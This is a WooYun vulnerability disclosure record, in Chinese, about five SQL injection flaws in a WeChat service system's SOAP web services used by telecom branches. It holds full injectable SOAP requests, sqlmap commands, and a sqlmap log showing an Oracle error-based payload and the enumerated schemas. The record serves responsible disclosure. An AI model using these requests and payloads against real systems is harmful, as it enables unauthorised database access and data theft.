{"id": 67172, "wybug_id": "wooyun-2015-0134847", "wybug_title": "某微信服务系统存在五个SQL注入影响多家电信分公司", "wybug_corp": "越亮传奇科技股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-08-20 16:25", "wybug_open_date": "2015-11-19 18:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-21：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向公众公开  简要描述： 某微信服务系统存在五个SQL注入影响多家电信分公司 详细说明：  这几个sql注入还是出现在webservices，其他地方均采用了参数化查询经测试发现该webservices的以下服务存在漏洞\n/service/UserApiService getTopServiceAccountList方法多个参数存在漏洞/service/WeixinApiService getAccessToken方法多个参数存在漏洞/service/WeixinApiService getBindByOpenid方法多个参数存在漏洞/service/WeixinApiService getBindByPhone方法多个参数存在漏洞/service/WeixinApiService getBindDataForPage方法多个参数存在漏洞\n0x1 sql注入1/service/UserApiService同样将下面的内容保存为wooyun.txt\nPOST /service/UserApiService HTTP/1.1Accept-Encoding: gzip,deflateContent-Type: text/xml;charset=UTF-8SOAPAction: \"\"Content-Length: 312Host: **.**.**.**Connection: Keep-AliveUser-Agent: Apache-HttpClient/4.1.1 (java 1.5)<soapenv:Envelope xmlns:soapenv=\"http://**.**.**.**/soap/envelope/\" xmlns:web=\"http://**.**.**.**\">   <soapenv:Header/>   <soapenv:Body>      <web:getTopServiceAccountList>         <web:in0>2*</web:in0>      </web:getTopServiceAccountList>   </soapenv:Body></soapenv:Envelope>\n然后运行:sqlmap.py -r wooyun.txt --dbms oracle\n\n0x2 sql注入2/service/WeixinApiService 服务的多个方法的多个参数存在漏洞，漏洞相似，选择其中之一进行证明：同样将下面的内容保存为wooyun.txt\nPOST /service/WeixinApiService HTTP/1.1Accept-Encoding: gzip,deflateContent-Type: text/xml;charset=UTF-8SOAPAction: \"\"Content-Length: 323Host: **.**.**.**Connection: Keep-AliveUser-Agent: Apache-HttpClient/4.1.1 (java 1.5)<soapenv:Envelope xmlns:soapenv=\"http://**.**.**.**/soap/envelope/\" xmlns:web=\"http://**.**.**.**\">   <soapenv:Header/>   <soapenv:Body>      <web:getBindByPhone>         <web:in0>1*</web:in0>         <web:in1>2</web:in1>      </web:getBindByPhone>   </soapenv:Body></soapenv:Envelope>\n然后运行:sqlmap.py -r wooyun.txt --dbms oracle\n\n其他的类似，数据包分别为：getAccessToken方法：\n<soapenv:Envelope xmlns:soapenv=\"http://**.**.**.**/soap/envelope/\" xmlns:web=\"http://**.**.**.**\">   <soapenv:Header/>   <soapenv:Body>      <web:getAccessToken>         <web:in0>1'</web:in0>      </web:getAccessToken>   </soapenv:Body></soapenv:Envelope>\ngetBindByOpenid方法：\n<soapenv:Envelope xmlns:soapenv=\"http://**.**.**.**/soap/envelope/\" xmlns:web=\"http://**.**.**.**\">   <soapenv:Header/>   <soapenv:Body>      <web:getBindByOpenid>         <web:in0>1'</web:in0>         <web:in1>2'</web:in1>      </web:getBindByOpenid>   </soapenv:Body></soapenv:Envelope>\ngetBindDataForPage方法：\n<soapenv:Envelope xmlns:soapenv=\"http://**.**.**.**/soap/envelope/\" xmlns:web=\"http://**.**.**.**\">   <soapenv:Header/>   <soapenv:Body>      <web:getBindDataForPage>         <web:in0>1'</web:in0>         <web:in1>2</web:in1>         <web:in2>3</web:in2>      </web:getBindDataForPage>   </soapenv:Body></soapenv:Envelope>\n用SQLMAP直接跑出的数据：sqlmap.py -r wooyun.txt --dbms oracle --dbs\n\n漏洞案例：\nhttp://**.**.**.**/main/login.jsphttp://**.**.**.**/main/login.jsphttp://**.**.**.**/main/login.jsp**.**.**.**/main/login.jsphttp://**.**.**.**/main/login.jsp\n   漏洞证明：  sqlmap.py -r wooyun.txt --dbms oracle --dbs\n_ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150423}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 21:21:36[21:21:36] [INFO] parsing HTTP request from 'ser.txt'custom injection marking character ('*') found in option '--data'. Do you want to process it? [Y/n/q] [21:21:36] [INFO] resuming back-end DBMS 'oracle' [21:21:36] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: <soapenv:Envelope xmlns:soapenv=\"http://**.**.**.**/soap/envelope/\" xmlns:web=\"http://**.**.**.**\">   <soapenv:Header/>   <soapenv:Body>      <web:getBindByPhone>         <web:in0>1' AND 4320=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(98)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (4320=4320) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'ieuf'='ieuf</web:in0>         <web:in1>2</web:in1>      </web:getBindByPhone>   </soapenv:Body></soapenv:Envelope>---[21:21:36] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[21:21:36] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[21:21:36] [INFO] fetching database (schema) names[21:21:36] [INFO] the SQL query used returns 22 entriesavailable databases [22]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] HR[*] IX[*] MAS[*] MDSYS[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TJ_VAPP[*] TSMSYS[*] WMSYS[*] XDB[21:21:37] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\**.**.**.**'[*] shutting down at 21:21:37\n   修复方案：  过滤吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-08-21 18:41 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}